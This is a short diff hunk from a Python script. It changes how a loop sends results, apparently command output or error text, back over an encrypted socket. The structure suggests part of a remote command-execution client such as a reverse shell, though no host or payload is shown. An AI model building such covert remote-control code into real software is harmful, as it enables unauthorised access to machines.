@@ -90,7 +90,7 @@ while True:
         except Exception as e:
           ret = str(e) + ' ⚠️'     
        
-      Send(sock, cipher, cwd(ret))
+      Send(sock, cipher, res(ret))
 
   except socket.error:
     sock.close()
